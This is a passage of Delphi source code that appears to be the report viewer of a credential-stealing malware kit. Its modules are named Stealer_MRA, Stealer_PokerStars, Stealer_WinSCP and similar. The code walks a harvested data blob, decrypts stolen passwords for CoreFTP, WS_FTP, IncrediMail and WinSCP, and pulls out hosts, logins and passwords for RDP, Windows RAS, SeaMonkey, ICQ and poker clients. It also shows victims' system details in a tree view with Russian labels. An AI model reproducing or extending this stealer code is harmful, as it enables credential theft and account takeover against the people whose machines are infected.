      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_HOST:      s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
        REPORT_DATA_LOGIN:     s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
        REPORT_DATA_PWD:       s:=formattype(bb)+CoreFTPDecrypt(copy(pchar(hData),0,dd div 2));
      end;
      coreftp:=coreftp+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto coreftp_onemoretime;
         Dec(hData,struc_size+4);
      coreftp:=coreftp+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'CoreFTP');
      node.Data:=pointer(coreftp);
      node.ImageIndex:=22;
      node.SelectedIndex:=22;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get WS_FTP
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      wsftp:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    wsftp_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_HOST:      s:=formattype(bb)+copy(pansichar(hData),0,dd);
        REPORT_DATA_LOGIN:     s:=formattype(bb)+copy(pansichar(hData),0,dd);
        REPORT_DATA_PWD:       s:=formattype(bb)+WS_FTP_Decrypt(copy(pansichar(hData),0,dd));
      end;
      wsftp:=wsftp+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto wsftp_onemoretime;
         Dec(hData,struc_size+4);
      wsftp:=wsftp+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'WS_FTP');
      node.Data:=pointer(wsftp);
      node.ImageIndex:=23;
      node.SelectedIndex:=23;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get RAS
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      ras:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    ras_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_NAME:          s:=formattype(bb)+copy(pchar(hData),0,dd);
        REPORT_DATA_RAS_AREA_CODE: s:=formattype(bb)+copy(pchar(hData),0,dd);
        REPORT_DATA_RAS_NUMBER:    s:=formattype(bb)+copy(pchar(hData),0,dd);
        REPORT_DATA_LOGIN:         s:=formattype(bb)+copy(pchar(hData),0,dd);
        REPORT_DATA_PWD:           s:=formattype(bb)+copy(pchar(hData),0,dd);
      end;
      ras:=ras+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto ras_onemoretime;
         Dec(hData,struc_size+4);
      ras:=ras+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Windows RAS');
      node.Data:=pointer(ras);
      node.ImageIndex:=30;
      node.SelectedIndex:=30;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get IncrediMail
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      im:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    im_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_NAME:      s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
        REPORT_DATA_LOGIN:     s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
        REPORT_DATA_SERVER:    s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
        REPORT_DATA_PWD:       s:=formattype(bb)+IncrediMail_Decrypt(hData,dd);
      end;
      im:=im+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto im_onemoretime;
         Dec(hData,struc_size+4);
      im:=im+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'IncrediMail');
      node.Data:=pointer(im);
      node.ImageIndex:=31;
      node.SelectedIndex:=31;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get SeaMonkey
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      seamonkey:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    seamonkey_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      seatmp:=copy(pansichar(hData),0,dd);
      case bb of
        REPORT_DATA_HOST:      s:=formattype(bb)+UTF8ToWideString(seatmp);
        REPORT_DATA_LOGIN:     s:=formattype(bb)+UTF8ToWideString(seatmp);
        REPORT_DATA_PWD:       s:=formattype(bb)+UTF8ToWideString(seatmp);
      end;
      seamonkey:=seamonkey+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto seamonkey_onemoretime;
         Dec(hData,struc_size+4);
      seamonkey:=seamonkey+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'SeaMonkey');
      node.Data:=pointer(seamonkey);
      node.ImageIndex:=32;
      node.SelectedIndex:=32;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get RDP
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      rdp:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    rdp_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_HOST:
          begin
            s:=copy(pchar(hData),0,dd div 2);
            if pos('TERMSRV/',s)<>0 then s:=copy(s, Length('TERMSRV/')+1, MaxInt);
            s:=formattype(bb)+s;
          end;
        REPORT_DATA_LOGIN: s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
        REPORT_DATA_PWD:   s:=formattype(bb)+copy(pchar(hData),0,dd div 2);
      end;
      rdp:=rdp+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto rdp_onemoretime;
        Dec(hData,struc_size+4);
      rdp:=rdp+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'RDP');
      node.Data:=pointer(rdp);
      node.ImageIndex:=33;
      node.SelectedIndex:=33;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get ICQ8
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      icq8:='';
      Dec(hData,4);
      // accs count
      dd2:=hData;
      Dec(hData,struc_size-4);
      // get sizeof ver.txt
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      sl:=tstringlist.Create;
      dd3:=Stealer_MRA.MRADecrypt(hData,hData-4,hData+dd,dd2,sl,1);
      if dd3>0 then
      begin
        for i:=1 to sl.Count do
        begin
          icq8:=icq8+sl.Strings[i-1]+#13#10;
        end;
        icq8:=icq8+#13#10;
        node:=Form3.TreeView1.Items.AddChild(nil, 'ICQ8');
        node.Data:=pointer(icq8);
        node.ImageIndex:=13;
        node.SelectedIndex:=13;
      end;
      Dec(hData,8);
      sl.Free;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get PokerStars
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      sl:=tstringlist.Create;
      pokerstars:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    pokerstars_onemoretime:
      CopyMemory(@dd,pointer(hData),4);
      inc(hData,4);
      inc(struc_cnt,4);
      dd3:=Stealer_PokerStars.ProcessShit(hData,dd,sl);
      for i:=1 to sl.Count do
      begin
        pokerstars:=pokerstars+sl.Strings[i-1]+#13#10;
      end;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto pokerstars_onemoretime;
        Dec(hData,struc_size+4);
      pokerstars:=pokerstars+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'PokerStars');
      node.Data:=pointer(pokerstars);
      node.ImageIndex:=34;
      node.SelectedIndex:=34;
      sl.Free;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Full Tilt Poker
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      sl:=tstringlist.Create;
      futp:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    fulltiltpoker_onemoretime:
      CopyMemory(@dd,pointer(hData),4);
      inc(hData,4);
      inc(struc_cnt,4);
      dd3:=Stealer_FullTiltPoker.ProcessShit(hData,dd,sl);
      for i:=1 to sl.Count do
      begin
        futp:=futp+sl.Strings[i-1]+#13#10;
      end;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto fulltiltpoker_onemoretime;
        Dec(hData,struc_size+4);
      futp:=futp+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'Full Tilt Poker');
      node.Data:=pointer(futp);
      node.ImageIndex:=35;
      node.SelectedIndex:=35;
      sl.Free;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;
  // Get WinSCP
  Dec(hData,4); // size
  CopyMemory(@struc_size,pointer(hData),4);
  if struc_size<>0 then
    begin
      scp:='';
      Dec(hData,struc_size);
      struc_cnt:=0;
    scp_onemoretime:
      CopyMemory(@dd,pointer(hData),sizeof(dd));
      inc(hData,sizeof(dd));
      inc(struc_cnt,sizeof(dd));
      CopyMemory(@bb,pointer(hData),sizeof(bb));
      inc(hData,sizeof(bb));
      inc(struc_cnt,sizeof(bb));
      case bb of
        REPORT_DATA_HOST:
          begin
            scp1:=copy(pansichar(hData),0,dd);
            s:=formattype(bb)+scp1;
          end;
        REPORT_DATA_LOGIN:
          begin
            scp2:=copy(pansichar(hData),0,dd);
            s:=formattype(bb)+scp2;
          end;
        REPORT_DATA_PWD:
          begin
            scp3:=copy(pansichar(hData),0,dd);
            s:=formattype(bb)+Stealer_WinSCP.WinSCPDecrypt(scp1,scp2,scp3);
          end;  
      end;
      scp:=scp+s+#13#10;
      inc(struc_cnt,dd);
      inc(hData,dd);
      if struc_cnt<struc_size then goto scp_onemoretime;
        Dec(hData,struc_size+4);
      scp:=scp+#13#10;
      node:=Form3.TreeView1.Items.AddChild(nil, 'WinSCP');
      node.Data:=pointer(scp);
      node.ImageIndex:=36;
      node.SelectedIndex:=36;
    end
  else
    begin
      Dec(hData,4); // Mark is here
    end;

  //-------
  parentnode:=Form3.TreeView1.Items.AddChild(nil,  'Сис. Инфо');
  parentnode.Data:=pointer(sysinfoabout);
  parentnode.ImageIndex:=10;
  parentnode.SelectedIndex:=10;
  node:=Form3.TreeView1.Items.AddChild(ParentNode, 'Общее');
  node.Data:=pointer(sysinfo);
  node.ImageIndex:=26;
  node.SelectedIndex:=26;
  node:=Form3.TreeView1.Items.AddChild(ParentNode, 'Диски');
  node.Data:=pointer(disks);
  node.ImageIndex:=24;
  node.SelectedIndex:=24;
  node:=Form3.TreeView1.Items.AddChild(ParentNode, 'Пользователи');
  node.Data:=pointer(users);
  node.ImageIndex:=29;
  node.SelectedIndex:=29;
  node:=Form3.TreeView1.Items.AddChild(ParentNode, 'Процессы');
  node.Data:=pointer(processes);
  node.ImageIndex:=27;
  node.SelectedIndex:=27;
  node:=Form3.TreeView1.Items.AddChild(ParentNode, 'Софт');
  node.Data:=pointer(soft);
  node.ImageIndex:=28;
  node.SelectedIndex:=28;
  node:=Form3.TreeView1.Items.AddChild(ParentNode, 'Папки');
  node.Data:=pointer(Folders);
  node.ImageIndex:=25;
  node.SelectedIndex:=25;
  parentnode.Expand(TRUE);
  //-------                                                                  
  VirtualFree(pointer(hDataOld), 0, MEM_RELEASE);
  Form3.TreeView1.Items.EndUpdate;
end;

end.

